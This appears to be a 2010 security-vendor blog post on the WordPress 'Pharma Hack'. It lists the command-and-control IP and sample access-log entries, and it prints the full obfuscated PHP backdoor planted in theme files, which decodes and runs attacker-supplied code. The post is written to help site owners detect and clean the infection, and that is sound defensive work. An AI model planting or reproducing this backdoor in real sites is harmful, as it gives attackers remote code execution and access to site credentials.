Pharma hack and their C&C (Command & control) server

A large portion of the sites Sucuri has been fixing in recent weeks are stemming from infections caused by the infamous Pharma Hack. We posted a detailed document explaining how to fix it and clean the attack:
Understanding and cleaning the pharma hack on WordPress
One thing we’ve noticed on all sites affected so far is that all of them have been receiving commands from this IP address:  94.76.241.4 (curingin.com).
If your site has been affected you can double check your access.log for these entries:

94.76.241.4 – – [31/Jul/2010:06:07:59 -0700] “POST /wp-content/themes/classic/sidebar.php HTTP/1.1” 500 374 “-” “-”
94.76.241.4 – – [31/Jul/2010:06:08:30 -0700] “POST /wp-content/themes/classic/sidebar.php HTTP/1.1” 500 447 “-” “-”
94.76.241.4 – – [31/Jul/2010:11:06:55 -0700] “POST /wp-content/themes/classic/sidebar.php HTTP/1.1” 500 444 “-” “-”
94.76.241.4 – – [30/Jul/2010:12:57:41 -0700] “POST /wp-content/themes/classic/comments.php HTTP/1.1” 200 202 “-” “-”

This IP is hosted at Blueconnex and even after tons of abuse reports (from multiple sources), the’ve sat idle.

Requests from the IP address try to access a backdoor they’ve inserted inside the /themes directory (generally sidebar.php, comments.php, 404.php, etc). This is what the backdoor looks like (all in one line):

< ?php $a = ‘m’.’d5′;
if($a($_REQUEST[$a])==’698357e86842′.’1222bcf89349bd5cf34d’)
{$w = ‘Cdbl0sYoWOiyJt3qtqyOoqxA’;$x = $_REQUEST[$w];
$y = ‘base’.’6′;$y.= ‘4_d’.’ecode’;$x = $y($x);$z = ‘creat’.’e_f’;
$z.= ‘unction’;$x = $z(”,$x);$x();} ?>

If your site is hacked and it keeps getting reinfected, look for this backdoor.
Once that file is called, it re-uploads another script into the /plugins directory and inserts new entries in the DB. Our friend W. Andrew Loe III did a good analysis of this attack and found how it works in detail (he was able to decode all the files in his honeypot).
That’s the first file the attackers uploaded to hack everything:
http://sucuri.net/?page=tools&title=blacklist&detail=7b1341a148b1d8a205587218f66ef912
You see that it reads wp-config.php, creates a new plugin and activates it. This is the file added to the plugins:
http://sucuri.net/?page=tools&title=blacklist&detail=a9663c48164df1fcc59253aed5a0defc
This one is executed as well:
http://sucuri.net/?page=tools&title=blacklist&detail=eb5db5a81632a089fd07fa259c0448a6
So a very interesting and complex attack they’ve managed to pull off. Many sites are still infected, so they probably have a large number of sites under their control.

If your site is infected and you need help, contact us.  We’ll get your site cleaned up and malware-free right away.
